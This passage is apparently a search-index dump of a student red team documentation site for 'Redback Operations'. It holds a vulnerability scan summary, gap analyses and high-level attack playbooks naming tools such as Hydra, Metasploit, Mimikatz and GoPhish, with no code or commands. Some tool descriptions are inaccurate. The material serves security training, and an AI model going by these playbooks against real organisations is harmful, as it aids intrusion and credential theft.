Address:​","type":1,"pageTitle":"Enumeration on Port 27107","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration#scanning-the-ip-address","content":"   Scan identified 30 vulnerabilities across various categories such as SSL, HTTP, and SSH, with a distribution of severity levels for Redback Operations.  ","version":"Next","tagName":"h3"},{"title":"Hosts:​","type":1,"pageTitle":"Enumeration on Port 27107","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration#hosts","content":"   The Nessus vulnerability scan conducted on the IP address 10.137.0.149, belonging to Redback Operations, revealed 35 vulnerabilities across varying severity levels. The scan, titled &quot;764 VulScan,&quot; was completed using a &quot;Basic Network Scan&quot; policy within 14 minutes. The vulnerabilities were assessed using the CVSS v3.0 scoring system, providing a standardized evaluation of the risks.  ","version":"Next","tagName":"h3"},{"title":"History including start time and end time of the scan:​","type":1,"pageTitle":"Enumeration on Port 27107","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration#history-including-start-time-and-end-time-of-the-scan","content":"   ","version":"Next","tagName":"h3"},{"title":"Notes:​","type":1,"pageTitle":"Enumeration on Port 27107","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration#notes","content":"   These notes indicate that during the scan, the Nessus tool encountered difficulties resolving certain hostnames, which may have impacted the ability to fully assess some vulnerabilities. The notes suggest checking the DNS configuration or retrying the scan to ensure accurate results. Despite these challenges, the scan was completed, and the findings provide valuable insights into the network's security posture.  ","version":"Next","tagName":"h3"},{"title":"Identified Mixed Vulnerabilities:​","type":1,"pageTitle":"Enumeration on Port 27107","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration#identified-mixed-vulnerabilities","content":"   The mixed vulnerabilities identified during the Nessus scan on IP address 10.137.0.149 associated with Redback Operations presents a comprehensive list of detected issues across various severity levels, including critical, high, medium, and low.Each vulnerability is accompanied by specific details such as its description, affected services or ports, potential impact, and recommended remediation steps. This overview enables a clear understanding of the security posture of the system and assists in prioritizing and addressing the identified vulnerabilities effectively to enhance overall network security.  ","version":"Next","tagName":"h3"},{"title":"Here are some of the High Severity Vulnerabilities:​","type":1,"pageTitle":"Enumeration on Port 27107","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration#here-are-some-of-the-high-severity-vulnerabilities","content":" SSL Certificate Cannot Be Trusted:      The scan identified a medium-severity vulnerability where the SSL certificate cannot be trusted. This issue arises from potential breaks in the certificate chain, use of untrusted or self-signed certificates, or other misconfigurations that could compromise secure communication.The detailed output provides further evidence, showing that the certificates at the top of the chain are signed by an unknown or untrusted certificate authority, raising concerns about the authenticity and integrity of the connection. The scan suggests generating or purchasing a proper SSL certificate from a trusted certificate authority to mitigate this risk.Addressing this issue is crucial to ensure the integrity and security of communications, thereby protecting the network from potential man-in-the-middle attacks and other vulnerabilities related to SSL/TLS configurations.  SSL Self Signed Certificate:    Addressing this issue is crucial to ensure the integrity and security of communications, thereby protecting the network from potential man-in-the-middle attacks and other vulnerabilities related to SSL/TLS configurations.The scan indicates that the SSL certificate in use is not signed by a recognized certificate authority, which could undermine the trustworthiness of the connection. This issue poses a potential risk, particularly in a production environment, as it could allow attackers to execute man-in-the-middle attacks, compromising secure communications. The report recommends resolving this vulnerability by acquiring and deploying a properly signed SSL certificate from a trusted certificate authority. Addressing this issue is essential to enhance the security of the network and to maintain the integrity and confidentiality of data exchanges.  SSL Certificate Expiry:    The report highlights that one or more SSL certificates associated with the services on this host have already expired. Expired certificates can compromise secure communications and may lead to potential security risks, such as enabling attackers to impersonate the affected services.To mitigate this issue, the report recommends purchasing or generating a new SSL certificate to replace the expired one. Addressing this vulnerability is critical to maintaining the integrity and security of encrypted communications on the network, ensuring continued trustworthiness of the services provided by Redback Operations.  ","version":"Next","tagName":"h3"},{"title":"Completed the Scan Successfully:​","type":1,"pageTitle":"Enumeration on Port 27107","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration#completed-the-scan-successfully","content":"   ","version":"Next","tagName":"h3"},{"title":"Conclusion:​","type":1,"pageTitle":"Enumeration on Port 27107","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration#conclusion-1","content":" To conclude, implementing the recommended remediation steps will significantly reduce the risk of exploitation and improve the system’s resilience to cyber threats. By prioritizing the high and critical vulnerabilities, Redback Operations can take a proactive approach to securing its infrastructure and maintaining the integrity and confidentiality of its network communications. ","version":"Next","tagName":"h3"},{"title":"Gap Analysis for Redback Operations Red Team","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/GapAnalysis_RedTeamRedback","content":"Last updated by: buvan008, Last updated on: '26/09/2024' Last updated by: buvan008, Last updated on: '26/09/2024' Gap Analysis for Redback Operations Red Team Gaps in Unauthorized Login Attempts Lack of Practical Reconnaissance: We need more hands-on experience in gathering intelligence about the target.Password Guessing Practice: We haven’t used tools like Hydra in real scenarios to see how effective they are.Credential Stuffing: We haven’t tested stolen credentials using tools like Sentry MBA.Brute Force Attack: We need to practice running brute force attacks with THC-Hydra. Gaps in Exploiting Vulnerabilities Vulnerability Scanning: We haven’t used Nessus or similar tools to scan for weaknesses.Exploit Development: We need more experience in crafting and using exploit code.Persistence Techniques: Using Meterpreter to maintain control after an exploit is something we need to practice. Gaps in Social Engineering Attacks Phishing Campaigns: We need to run actual phishing simulations to see how well they work.Pretexting Scenarios: Creating believable scenarios to trick people into giving up info needs more practice.Baiting: We haven’t set up bait scenarios to lure people into compromising themselves. Gaps in Managing Insider Threats User Activity Monitoring: We need to practice using tools that monitor user behavior.Role-based Access Control (RBAC): Implementing and managing RBAC in real settings needs more experience. Gaps in Establishing Backdoor Access Creating Secret Channels: We need to try out methods for covert communication within systems.Default Credentials: We should practice exploiting systems that use default usernames and passwords.Exploiting Flaws: More practice in identifying and using system flaws to create backdoors is needed. Gaps in Privilege Escalation Exploiting Authentication Weaknesses: We need to find and exploit weak authentication procedures.Misconfigured Permissions: Practicing how to find and use misconfigured permissions for escalating privileges.Software Vulnerabilities: More hands-on experience with tools that exploit software vulnerabilities. Gaps in Handling Data Breaches Social Engineering for Credentials: More practical attempts at tricking people into giving up their credentials.Exploiting Database Vulnerabilities: Practice in using SQL injection and other methods to breach databases.Account Compromises: We need to try out methods for cracking passwords and compromising user accounts. Practical Implementation: Gap: Lack of real-world practice.Suggestion: Conduct regular hands-on simulations. Performance Metrics: Gap: No clear way to measure effectiveness.Suggestion: Set clear measurement criteria for success. Creative Problem-Solving: Gap: Limited encouragement for innovative solutions.Suggestion: Encourage more creative thinking and problem-solving. By addressing these gaps, we can better prepare for real-world cybersecurity challenges and improve our overall security posture.","keywords":"","version":"Next"},{"title":"Gap Analysis for Redback Operations Red Team","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/GapAnalysisM","content":"","keywords":"","version":"Next"},{"title":"Overview​","type":1,"pageTitle":"Gap Analysis for Redback Operations Red Team","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/GapAnalysisM#overview","content":" Last year, Redback Operations addressed various security issues such as unauthorized access, denial of service, phishing, malware outbreaks, and more, establishing a solid foundation for incident response. However, no penetration testing was conducted last semester, and only some use cases were documented. This semester, a strong focus on vulnerability scanning and penetration testing is recommended, along with addressing authentication gaps and vulnerabilities on specific ports.  ","version":"Next","tagName":"h2"},{"title":"Current State of Redback Operations:​","type":1,"pageTitle":"Gap Analysis for Redback Operations Red Team","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/GapAnalysisM#current-state-of-redback-operations","content":" ","version":"Next","tagName":"h2"},{"title":"Identified Gaps:​","type":1,"pageTitle":"Gap Analysis for Redback Operations Red Team","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/GapAnalysisM#identified-gaps","content":" ","version":"Next","tagName":"h3"},{"title":"No Authentication on MQTT:​","type":1,"pageTitle":"Gap Analysis for Redback Operations Red Team","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/GapAnalysisM#no-authentication-on-mqtt","content":" Gap: Lack of authentication and encryption mechanisms for MQTT topics. MQTT over SSL (port 8883) was filtered, indicating unavailability of secure communication which can lead to eavesdropping on messages and performing malicious activities such as publishing unwanted data to the broker.Suggestion: Enforce authentication for MQTT, using username/password or certificate-based authentication, and secure communications over port 8883 with TLS.  ","version":"Next","tagName":"h3"},{"title":"Slowloris DoS Vulnerability on HTTP/HTTPS (Ports 80, 443, 8000):​","type":1,"pageTitle":"Gap Analysis for Redback Operations Red Team","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/GapAnalysisM#slowloris-dos-vulnerability-on-httphttps-ports-80-443-8000","content":" Gap: HTTP/HTTPS services are vulnerable to the Slowloris DoS attack, which can cause resource exhaustion by holding connections open indefinitely.Suggestion: Limit the number of concurrent connections, reduce timeout settings, and implement web application firewalls (WAF) to mitigate this risk.  ","version":"Next","tagName":"h3"},{"title":"Vulnerable Ports (SSL/TLS Configuration):​","type":1,"pageTitle":"Gap Analysis for Redback Operations Red Team","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/GapAnalysisM#vulnerable-ports-ssltls-configuration","content":" Gap: Several ports (such as 443, 9001, 9200) were found to be using weak Diffie-Hellman key exchange parameters (1024-bit), making them susceptible to passive eavesdropping and man-in-the-middle attacks.Suggestion: Update the SSL/TLS configurations to use stronger key exchange algorithms, such as 2048-bit Diffie-Hellman or Elliptic Curve Diffie-Hellman (ECDH), to enhance encryption strength.  ","version":"Next","tagName":"h3"},{"title":"HTTP Verb Tampering (Authentication Bypass on Port 80):​","type":1,"pageTitle":"Gap Analysis for Redback Operations Red Team","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/GapAnalysisM#http-verb-tampering-authentication-bypass-on-port-80","content":" Gap: The web server on port 80 is vulnerable to HTTP verb tampering, which can allow attackers to bypass authentication and gain unauthorized access to protected resources.Suggestion: Implement strict HTTP method validation on the web server, ensuring that only valid methods (GET, POST, etc.) are allowed. Misconfigured .htaccess files should be reviewed and corrected to prevent bypass attacks.  ","version":"Next","tagName":"h3"},{"title":"Lack of Phishing Simulation:​","type":1,"pageTitle":"Gap Analysis for Redback Operations Red Team","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/GapAnalysisM#lack-of-phishing-simulation","content":" Gap: Redback Operations has not conducted phishing simulations or employee awareness training regularly. This leaves the organization vulnerable to email-based phishing attacks.Suggestion: Conduct regular phishing awareness training and deploy email filtering tools to block malicious emails before they reach users.  By addressing gaps in MQTT authentication, Slowloris DoS vulnerabilities, weak SSL/TLS configurations, HTTP verb tampering, and the lack of phishing simulations, Redback Operations will significantly strengthen its overall security. ","version":"Next","tagName":"h3"},{"title":"Improper Usage Red Team Usecase","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#1-introduction","content":" In today's dynamic cybersecurity landscape, organizations face a myriad of threats, ranging from insider attacks to external breaches and everything in between. To effectively combat these threats, organizations must proactively assess their security posture and identify vulnerabilities before adversaries exploit them. Red team exercises play a crucial role in this regard, allowing organizations to simulate real-world attack scenarios and test the effectiveness of their defenses.  This document outlines various red team playbooks focusing on insider threats, external attacks, data breaches, phishing incidents, ransomware attacks, and credential theft. Each playbook provides a comprehensive overview of the objectives, steps involved, and tools and techniques utilized to simulate these specific threat scenarios within Redback Operations.  ","version":"Next","tagName":"h2"},{"title":"2 Insider Threat​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#2-insider-threat","content":"   ","version":"Next","tagName":"h2"},{"title":"2.1 Objective: Gain Elevated Privileges​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#21-objective-gain-elevated-privileges","content":" The primary objective of a red team exercise focusing on insider threats within Redback Operations is to simulate how an adversary could gain elevated privileges within the organization's systems to access sensitive data or carry out malicious activities without detection. By achieving this objective, the red team aims to highlight vulnerabilities in access controls, trust relationships, and security mechanisms, enabling the organization to implement effective countermeasures and mitigate the risk of insider threats effectively.  ","version":"Next","tagName":"h3"},{"title":"2.2 Steps in Simulating Insider Threats​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#22-steps-in-simulating-insider-threats","content":" Identify Vulnerable or Disgruntled Employees: The first step in the red team exercise is to identify employees within Redback Operations who may pose a threat due to their access to sensitive systems or data. This involves conducting thorough reconnaissance to pinpoint individuals with access privileges that could be exploited for malicious purposes. Vulnerable or disgruntled employees are particularly targeted as they may be more susceptible to manipulation or coercion.Exploit Weaknesses in Access Control Mechanisms: Once potential insider threats are identified, the red team will seek to exploit weaknesses in access control mechanisms or misconfigurations to gain initial access to the organization's systems. This could involve exploiting vulnerabilities in authentication protocols, weak passwords, or insecure configurations to bypass security controls and establish a foothold within the network.Use Social Engineering Tactics or Insider Knowledge: Social engineering plays a crucial role in escalating privileges and bypassing security controls in insider threat scenarios. Red teamers may deploy phishing emails, pretexting, or baiting techniques to manipulate insiders into divulging credentials, providing access to sensitive systems, or executing malicious payloads. Alternatively, insider knowledge obtained through reconnaissance may be leveraged to gain trust and access to critical assets.  ","version":"Next","tagName":"h3"},{"title":"2.3 Tools and Techniques for Insider Threat Simulations​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#23-tools-and-techniques-for-insider-threat-simulations","content":" Social Engineering: Phishing kits, pretexting scripts, and social engineering toolkits can be used to craft convincing phishing emails or pretexting scenarios tailored to exploit the psychological vulnerabilities of targeted insiders.Exploitation of Trust Relationships: Tools such as BloodHound or Rubeus can be employed to map trust relationships within the organization and identify paths to privileged accounts or sensitive data accessible to insiders.Exploitation of Misconfigurations: Vulnerability scanners and penetration testing tools can help identify misconfigured permissions or access control lists (ACLs) that could be exploited by insiders to escalate privileges and gain unauthorized access to critical assets.  ","version":"Next","tagName":"h3"},{"title":"3 External Attack​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#3-external-attack","content":"   ","version":"Next","tagName":"h2"},{"title":"3.1 Objective: Compromise External-Facing Systems​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#31-objective-compromise-external-facing-systems","content":" The primary objective of a red team exercise focusing on external attacks within Redback Operations is to simulate how adversaries could compromise the organization's systems or networks from external sources to gain elevated privileges and access sensitive data. By achieving this objective, the red team aims to identify vulnerabilities in external-facing systems, assess the effectiveness of existing defenses, and recommend improvements to mitigate the risk of external attacks effectively.  ","version":"Next","tagName":"h3"},{"title":"3.2 Steps​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#32-steps","content":" Identify Vulnerabilities in External-Facing Systems: The first step in the red team exercise is to identify vulnerabilities in Redback Operations' external-facing systems or network infrastructure. This involves conducting comprehensive vulnerability assessments and penetration testing to identify potential entry points and weaknesses that could be exploited by attackers to gain unauthorized access.Exploit Vulnerabilities to Gain Initial Access: Once vulnerabilities are identified, the red team will seek to exploit them to gain initial access or establish footholds within the organization's network. This may involve exploiting known vulnerabilities in software, misconfigured network services, or weak authentication mechanisms to bypass security controls and gain a foothold on the network.Escalate Privileges: With initial access established, the red team will aim to escalate privileges to gain administrative or superuser access for deeper penetration into Redback Operations' systems. This may involve exploiting vulnerabilities in privilege escalation mechanisms, weakly protected accounts, or misconfigured access controls to gain higher levels of access and control over the network.  ","version":"Next","tagName":"h3"},{"title":"3.3 Tools and Techniques​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#33-tools-and-techniques","content":" Vulnerability Scanners: Tools like Nessus and OpenVAS can be used to conduct automated vulnerability scans of Redback Operations' external-facing systems, identifying potential vulnerabilities that could be exploited by attackers.Exploit Frameworks: Metasploit and Exploit-DB provide a comprehensive database of known exploits and payloads that can be used to exploit vulnerabilities identified during the scanning phase, gaining unauthorized access to target systems.Privilege Escalation Exploits: Tools like Windows-Exploit-Suggester and Linux Exploit Suggester can be used to identify and exploit vulnerabilities that allow attackers to escalate privileges and gain administrative access to target systems.  ","version":"Next","tagName":"h3"},{"title":"4 Data Breaches​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#4-data-breaches","content":"   ","version":"Next","tagName":"h2"},{"title":"4.1 Objective: Obtain Elevated Privileges and Exfiltrate Data​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#41-objective-obtain-elevated-privileges-and-exfiltrate-data","content":" The primary objective of a red team exercise focusing on data breaches within Redback Operations is to simulate how adversaries could obtain elevated privileges to access and exfiltrate sensitive data from the organization's systems or databases. By achieving this objective, the red team aims to identify weaknesses in data storage and access controls, exploit vulnerabilities or misconfigurations to gain unauthorized access, and exfiltrate sensitive data without detection.  ","version":"Next","tagName":"h3"},{"title":"4.2 Steps​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#42-steps","content":" Identify Weaknesses in Data Storage and Access Controls: The first step in the red team exercise is to identify weaknesses in data storage or access controls that could allow unauthorized access to sensitive data. This involves conducting thorough assessments of the organization's data storage mechanisms, databases, file repositories, and access control policies to identify potential entry points for attackers.Exploit Vulnerabilities or Misconfigurations: Once weaknesses are identified, the red team will seek to exploit vulnerabilities or misconfigurations to gain access to databases or file repositories containing sensitive data. This may involve exploiting unpatched vulnerabilities, misconfigured permissions, or weak authentication mechanisms to bypass security controls and gain unauthorized access to the target systems.Escalate Privileges: With access to the target systems obtained, the red team will aim to escalate privileges to gain access to restricted or confidential data. This may involve exploiting vulnerabilities in privilege escalation mechanisms, weakly protected accounts, or misconfigured access controls to gain higher levels of access and retrieve sensitive data stored within the organization's databases.  ","version":"Next","tagName":"h3"},{"title":"4.3 Tools and Techniques​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#43-tools-and-techniques","content":" Exploitation of Unpatched Vulnerabilities: Techniques like SQL Injection can be used to exploit vulnerabilities in web applications or database management systems, allowing attackers to manipulate SQL queries and gain unauthorized access to databases.SQL Injection Tools: Tools like SQLMap and Burp Suite automate the process of identifying and exploiting SQL injection vulnerabilities, enabling attackers to retrieve sensitive data from databases without requiring extensive manual intervention.Data Exfiltration Tools: Tools like Mimikatz and BloodHound can be used to extract sensitive data from compromised systems and exfiltrate it to external servers or storage locations, bypassing security controls and evading detection.  ","version":"Next","tagName":"h3"},{"title":"5 Phishing Incident​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#5-phishing-incident","content":"   ","version":"Next","tagName":"h2"},{"title":"5.1 Objective: Gain Elevated Privileges through Social Engineering​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#51-objective-gain-elevated-privileges-through-social-engineering","content":" The primary objective of a red team exercise focusing on phishing incidents within Redback Operations is to demonstrate how adversaries can gain elevated privileges by tricking employees into divulging their credentials or providing access to sensitive systems. By achieving this objective, the red team aims to assess the effectiveness of the organization's phishing awareness training programs, identify vulnerable employees, and highlight the importance of implementing robust security measures to prevent phishing attacks.  ","version":"Next","tagName":"h3"},{"title":"5.2 Steps​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#52-steps","content":" Craft Convincing Phishing Emails: The first step in the red team exercise is to craft convincing phishing emails or messages impersonating trusted sources within Redback Operations. These emails may appear legitimate and include enticing subject lines or urgent requests to prompt recipients to take action, such as clicking on malicious links or providing login credentials.Distribute Phishing Emails to Targeted Employees: Once the phishing emails are crafted, the red team will distribute them to targeted employees and stakeholders within the organization. These targeted individuals may include employees with access to sensitive systems or data, executives, or individuals in positions of authority who are more likely to be targeted by adversaries.Exploit Compromised Credentials: Upon successful phishing attempts, the red team will exploit compromised credentials to escalate privileges and access sensitive data or systems within Redback Operations. This may involve using keylogging or form grabbing techniques to capture login credentials entered by unsuspecting employees, bypassing multi-factor authentication (MFA), or exploiting trust relationships to gain access to privileged accounts.  ","version":"Next","tagName":"h3"},{"title":"5.3 Tools and Techniques​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#53-tools-and-techniques","content":" Phishing Frameworks: Tools like GoPhish and PhishingFrenzy automate the process of crafting and distributing phishing emails, enabling attackers to simulate real-world phishing attacks efficiently.Credential Harvesting: Techniques such as keylogging and form grabbing can be used to capture login credentials entered by targeted individuals, allowing attackers to gain unauthorized access to sensitive systems or data.2FA Bypass Techniques: Social engineering tactics or phishing of 2FA tokens can be employed to bypass multi-factor authentication measures and gain access to compromised accounts or systems.  ","version":"Next","tagName":"h3"},{"title":"6 Ransomware​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#6-ransomware","content":"   ","version":"Next","tagName":"h2"},{"title":"6.1 Objective: Deploy Ransomware to Encrypt Data​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#61-objective-deploy-ransomware-to-encrypt-data","content":" The primary objective of a red team exercise focusing on ransomware attacks within Redback Operations is to demonstrate how adversaries can gain elevated privileges to deploy ransomware within the organization's systems or networks. By achieving this objective, the red team aims to assess the effectiveness of the organization's security controls, identify vulnerabilities or misconfigurations that may lead to ransomware attacks, and highlight the importance of implementing proactive security measures to mitigate the risk of such incidents.  ","version":"Next","tagName":"h3"},{"title":"6.2 Steps​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#62-steps","content":" Identify Vulnerabilities or Misconfigurations: The first step in the red team exercise is to identify vulnerabilities or misconfigurations in Redback's systems that may allow for unauthorized access or execution of malicious code. These vulnerabilities could include unpatched software, weak authentication mechanisms, or misconfigured access controls that adversaries can exploit to gain initial access to the organization's network.Exploit Vulnerabilities to Gain Initial Access: Once vulnerabilities are identified, the red team will exploit them to gain initial access to Redback's systems or networks. This may involve delivering malware through phishing emails, exploiting known vulnerabilities using exploit kits, or leveraging compromised credentials obtained through previous reconnaissance activities.Escalate Privileges for Deploying Ransomware: After gaining initial access, the red team will escalate privileges to gain administrative access within Redback's network. This step is crucial for deploying ransomware payloads effectively and ensuring that adversaries have sufficient access to encrypt critical data and systems. Privilege escalation exploits, such as known vulnerabilities or custom exploits, may be used to escalate privileges and gain administrative access.  ","version":"Next","tagName":"h3"},{"title":"6.3 Tools and Techniques for Ransomware Attacks​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#63-tools-and-techniques-for-ransomware-attacks","content":" Malware Delivery: Phishing emails and exploit kits are commonly used to deliver ransomware payloads to targeted systems or networks, exploiting vulnerabilities or enticing users to click on malicious links or attachments.Lateral Movement: Adversaries may use compromised credentials obtained through phishing or exploitation of trust relationships to move laterally within the network, gaining access to additional systems or resources.Privilege Escalation Exploits: Known vulnerabilities or custom exploits can be used to escalate privileges and gain administrative access within Redback's network, enabling adversaries to deploy ransomware payloads effectively.  ","version":"Next","tagName":"h3"},{"title":"7 Credential Theft​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#7-credential-theft","content":"   ","version":"Next","tagName":"h3"},{"title":"7.1 Objective: Obtain Elevated Privileges via Credential Theft​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#71-objective-obtain-elevated-privileges-via-credential-theft","content":" The primary objective of simulating credential theft attacks within Redback Operations is to demonstrate how adversaries can obtain elevated privileges within the organization's systems or networks by stealing credentials from employees or stakeholders. By achieving this objective, the red team aims to assess the effectiveness of the organization's authentication mechanisms, identify vulnerabilities in its security posture, and highlight the importance of implementing robust measures to prevent unauthorized credential access.  ","version":"Next","tagName":"h3"},{"title":"7.2 Steps​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#72-steps","content":" Identify Employees or Stakeholders with Privileged Access: The initial step in the red team exercise is to identify employees or stakeholders within Redback Operations who have privileged access to critical systems or data. This may involve conducting reconnaissance activities to gather information about user roles, responsibilities, and access privileges within the organization.Use Phishing Attacks or Social Engineering Tactics: Once high-privileged users are identified, the red team will employ phishing attacks, social engineering tactics, or other techniques to trick users into revealing their login credentials or authentication tokens. This may include sending phishing emails impersonating trusted sources or creating fake login pages to harvest credentials.Escalate Privileges Using Compromised Credentials: After obtaining credentials from targeted users, the red team will escalate privileges within Redback's systems or networks to gain access to sensitive data or carry out unauthorized activities. This step may involve using compromised credentials to bypass authentication mechanisms, access restricted resources, or impersonate legitimate users to evade detection.  ","version":"Next","tagName":"h3"},{"title":"7.3 Tools and Techniques​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#73-tools-and-techniques","content":" Credential Phishing: Phishing emails and phishing websites are commonly used to trick users into divulging their login credentials by impersonating trusted entities or enticingusers to click on malicious links.Keylogging: Malware or keyloggers can be used to capture keystrokes entered by users, allowing adversaries to record login credentials and authentication tokens without the user's knowledge.Pass-the-Hash: Credential theft tools and techniques such as pass-the-hash attacks involve exploiting hashed credentials stored on compromised systems to authenticate to other systems within the network, bypassing the need for plaintext passwords.  ","version":"Next","tagName":"h3"},{"title":"8 Conclusion​","type":1,"pageTitle":"Improper Usage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Improper-Usage-Red-Team-Usecase#8-conclusion","content":" In conclusion, red team exercises serve as invaluable tools for organizations to enhance their cybersecurity resilience by identifying and addressing weaknesses in their defenses. By simulating realistic attack scenarios, organizations can better understand their adversaries' tactics, techniques, and procedures, allowing them to bolster their security measures and mitigate the risk of cyber threats effectively.  Through the outlined playbooks, Redback Operations can gain insights into potential vulnerabilities within their systems and networks, assess the effectiveness of existing security controls, and develop proactive strategies to strengthen their overall security posture. By investing in red team exercises and adopting a proactive approach to cybersecurity, organizations can stay one step ahead of adversaries and safeguard their critical assets against evolving threats. ","version":"Next","tagName":"h2"},{"title":"Malware Outbreak Incident Red Team Usecase","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase","content":"","keywords":"","version":"Next"},{"title":"1. Introduction:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#1-introduction","content":" Within the landscape of cybersecurity, the Data Theft Playbook emerges as a beacon of guidance, offering Red Teams a meticulously crafted roadmap to simulate and evaluate an organization's preparedness against data breaches and unauthorized intrusions. By orchestrating a series of simulated attacks, Red Teams embark on a mission to dissect the organization's security posture, scrutinize incident response protocols, and extract invaluable insights aimed at bolstering overall resilience against data theft incidents. This comprehensive guide serves as a compass, navigating Red Teams through the complex terrain of cybersecurity challenges, with the ultimate goal of fortifying the organization's defenses against the relentless tide of cyber threats.  ","version":"Next","tagName":"h2"},{"title":"2. Worms​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#2-worms","content":"   ","version":"Next","tagName":"h2"},{"title":"2.1 Objective:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#21-objective","content":" Stop the worm from spreading further, remove it from infected systems, and patch security vulnerabilities to prevent future infections.  ","version":"Next","tagName":"h3"},{"title":"2.2 Steps:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#22-steps","content":" Isolate infected systems to prevent further spread: Isolation of infected systems is crucial to prevent the worm from spreading to other devices on the network. This can be achieved by disconnecting the infected systems from the network or by creating VLANs to segregate them from the rest of the network traffic.Identify the entry point and security vulnerabilities exploited by the worm: Determining how the worm entered the system and the vulnerabilities it exploited is essential for effectively containing and eradicating it. This may involve analyzing system 